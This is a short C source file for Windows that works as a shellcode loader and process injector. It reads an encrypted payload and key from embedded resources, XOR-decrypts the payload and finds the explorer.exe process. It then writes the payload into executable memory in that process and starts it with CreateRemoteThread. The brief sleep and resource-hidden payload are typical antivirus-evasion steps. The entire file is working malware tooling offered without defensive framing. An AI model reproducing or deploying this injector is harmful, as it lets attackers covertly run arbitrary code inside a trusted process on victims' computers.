#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>

void LoadResourceData(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void DecryptXOR(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
    for (DWORD i = 0; i < codeLen; i++) {
        code[i] ^= key[i % keyLen]; 
    }
}


int main() {
    Sleep(2000);
    
    char* AESkey;
    DWORD AESkeyLen;
    LoadResourceData("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    LoadResourceData("AESCODE", &AESCode, &AESCodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    Process32First(snapshot, &pe32);
    
    while(Process32Next(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID memalo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
             
              WriteProcessMemory(hProcess, memalo, AESCode, AESCodeLen, NULL);
             
             

             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
             WaitForSingleObject(tHandle, INFINITE);
             
              VirtualFreeEx(hProcess, memalo, 0, MEM_RELEASE);
           
              CloseHandle(tHandle);
           
              CloseHandle(hProcess);
              
              break;

         }
      }

    return 0;
}
